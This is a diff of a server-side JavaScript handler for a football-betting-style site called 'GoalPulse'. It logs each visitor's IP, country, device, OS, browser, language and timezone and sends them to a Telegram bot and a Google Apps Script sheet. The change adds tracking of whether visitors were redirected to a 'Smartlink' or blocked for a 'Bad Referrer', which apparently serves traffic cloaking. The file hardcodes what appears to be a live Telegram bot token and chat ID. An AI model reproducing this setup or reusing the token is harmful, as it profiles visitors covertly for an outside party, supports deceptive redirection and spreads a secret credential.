@@ -2,7 +2,8 @@
 
 const TELEGRAM_TOKEN = '8424656659:AAEbo9X2Kuw1QZDRPyu_Uy-SNg6T36vQoRg';
 const CHAT_ID = '7203463194';
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxnVaFc4YKZta4P5nDnM-eGAREM6PhUx-taNfoEeXspB9spwaAvTj_0FIL3Gc7EA4vZUQ/exec'; 
+// ⚠️ ضع رابط الـ Google Apps Script الجديد (V6) هنا
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycby7xcuftof9LzOgVFlxQAJoiyKxzd2UywiMzmr6Ew8YgsQkouJrDaa9a2E0CXh4gcvD5Q/exec'; 
 
 const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
@@ -35,10 +36,24 @@ export async function onRequestPost(context) {
         const flag = getCountryFlag(country);
         const timestamp = new Date().toISOString().replace('T', ' @ ').split('.')[0] + ' UTC';
 
-        // 1️⃣ رسالة التليجرام الخاصة بكرة القدم
+        // تحديد أيقونة ورسالة التحويل لتليجرام
+        const redirectStatus = body.redirectStatus || 'Off';
+        let redirectIcon = '⚪️';
+        let redirectText = 'No Redirect';
+        if (redirectStatus === 'Redirected') {
+            redirectIcon = '🔄';
+            redirectText = 'Redirected to Smartlink!';
+        } else if (redirectStatus === 'Blocked') {
+            redirectIcon = '🛑';
+            redirectText = 'Blocked (Bad Referrer)';
+        }
+
+        // 1️⃣ رسالة التليجرام الموحدة
         const telegramMessage = `
 ⚽ <b>𝗚𝗼𝗮𝗹𝗣𝘂𝗹𝘀𝗲 𝗡𝗲𝘄 𝗣𝘂𝗻𝘁𝗲𝗿</b>
 ━━━━━━━━━━━━━━━━━━━━
+
+ ${redirectIcon} <b>𝗥𝗲𝗱𝗶𝗿𝗲𝗰𝘁: ${redirectText}</b>
 
 🌐 <b>𝗚𝗲𝗼 & 𝗡𝗲𝘁𝘄𝗼𝗿𝗸</b>
 • IP: <code>${ip}</code>
@@ -57,14 +72,13 @@ export async function onRequestPost(context) {
 • Device: ${body.device || 'N/A'}
 • OS: ${body.os || 'N/A'}
 • Browser: ${body.browser || 'N/A'}
-• Screen: ${body.screenRes || 'N/A'}
 • Language: ${body.lang || 'N/A'}
 
 ⏱ <b>𝗧𝗶𝗺𝗲𝘀𝘁𝗮𝗺𝗽</b>
  ${timestamp}
         `.trim();
 
-        // 2️⃣ بيانات جوجل شيت
+        // 2️⃣ بيانات جوجل شيت الموحدة
         const sheetsData = {
             timestamp: timestamp,
             ip: ip,
@@ -84,7 +98,8 @@ export async function onRequestPost(context) {
             browser: body.browser || 'N/A',
             screenRes: body.screenRes || 'N/A',
             lang: body.lang || 'N/A',
-            timezone: body.tz || 'N/A'
+            timezone: body.tz || 'N/A',
+            redirectStatus: redirectStatus // إضافة حالة التحويل للشيت
         };
 
         const tgPromise = fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
